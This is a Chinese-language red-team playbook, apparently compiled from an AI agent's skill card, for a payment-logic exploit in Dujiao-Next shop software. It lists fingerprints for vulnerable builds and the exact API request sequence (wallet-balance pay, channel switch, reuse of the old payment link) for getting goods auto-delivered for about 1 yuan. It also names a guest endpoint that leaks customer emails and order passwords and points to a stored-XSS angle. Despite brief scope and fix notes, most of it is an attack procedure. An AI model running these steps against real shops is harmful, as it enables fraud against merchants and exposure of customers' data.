---
title: "独角Next混合支付1元购手法.md"
generated: 2026-10-21
kind: consolidated-playbook
note: 由现役技能卡自动汇总；保留原卡语义，未改写攻防步骤
---

# 独角Next混合支付1元购手法.md

> 本页由引用该路径的现役技能卡汇总生成。原始内容与完整步骤见下方来源卡；不要把它当成独立的新打法。

## 来源卡

- `/root/.hermes/skills/security/dujiao-next-1yuan-pay/SKILL.md`

## 汇总内容

### dujiao-next-1yuan-pay

来源：`/root/.hermes/skills/security/dujiao-next-1yuan-pay/SKILL.md`

# 独角 Next 混合支付 1 元购（F18）

## 真源

1. `docs/playbooks/独角Next混合支付1元购手法.md`
2. 长文根因：`docs/learning/shizhan-pack/skills/redteam/dujiao-next-1yuan-pay/SKILL.md`
3. 支付栈取钥：`docs/playbooks/支付栈旁站弱口取钥回灌手法.md` · `tools/ops/pay_matrix.py`
4. 假支付（无 use_balance 时）：`payment-callback-forgery`

## 指纹（旧构建可打）

| 信号 | 含义 |
|------|------|
| `/dj.svg` + `/api/v1/payments` + `use_balance` | Dujiao-Next |
| 配置**无** `app_version` 仍暴露已移除特性 | 旧构建，未跟 f57247b4 / v1.4.6 |
| ≥2 活跃渠道（epay + upay 等） | F18 前置 |
| `GET .../auth-defaults` 游客 200 | 材料面，不是收工 |

PHP `dujiaoka` / `/pay/{handle}/` → `独角数卡支付加固.md`。  
`acg.js` / `shared_id` → `acg-faka`。

## 强制

1. 目标在 scope。中转支付域静默 `scope_expand`。
2. **会员支付字段是数字 `order_id`，不是 `order_no`。** 用错会 400/空转。
3. 钱包调到 **价 − 1**（如 ¥18 商品余额 17）。余额 ≥ 价会走全额钱包，不是 F18。
4. 收工线 = **自动发货出卡**。人工发货 SKU 付了也不算。
5. 无钥 `POST /api/v1/payments/callback` 恒 fail，不要当主链。
6. **批量刷库存 / 耗余额循环先问。** 授权内先打通 **1 单** 验证。

## F18 步骤（会员）

```text
登录 POST /api/v1/auth/login → Bearer
下单 POST /api/v1/orders  {"items":[{"product_id","sku_id","quantity":1}]}
     → 记 order.id（数字）
压单 POST /api/v1/payments  {"order_id":ID,"channel_id":A,"use_balance":true}
     → online≈1，记 pay_url = L1
换渠 POST /api/v1/payments  {"order_id":ID,"channel_id":B,"use_balance":false}
     → 余额退回；L1 仍可开
复用 POST /api/v1/payments  {"order_id":ID,"channel_id":A,"use_balance":false}
     → 同一 L1
打开 L1：网关 total_amount 仍约 1.03（1+手续费）→ 实付
GET /api/v1/orders/ID → completed + fulfillment.payload
钱包净值仍 ≈ 价−1
```

变体：换渠后不请求复用、直接付 L1（只要缺陷①③）。  
单渠道重复创建会 reuse pending、余额不释放，F18 不成立。

## 并行材料（不是收工）

```text
GET /api/v1/guest/orders/by-order-no/{order_no}/auth-defaults
→ 未授权回 email + order_password
同 order_no 打旁域 → 同库则整租户订单面等价
order_password 可写 HTML → Stored XSS 材料；无管员会话记 Medium
```

order_no 常在支付页 subject / 网关跳转里。

## 否定面（别空转）

| 面 | 常见结果 |
|----|----------|
| 无钥 callback | `fail` |
| epay 商户钥小字典 | 未中则转支付栈弱口，禁止爆破 |
| 主站 `/api/v1/admin` | 前台 route not found |
| 礼品卡弱码 | 「充值卡不存在」 |

## 修复对照

v1.4.6+ / `f57247b4`：supersede 旧 pending、履约校验实付、钱包幂等键按轮次。  
复测：换渠后 L1 应全额或失效；付 1 元不得 `completed`。
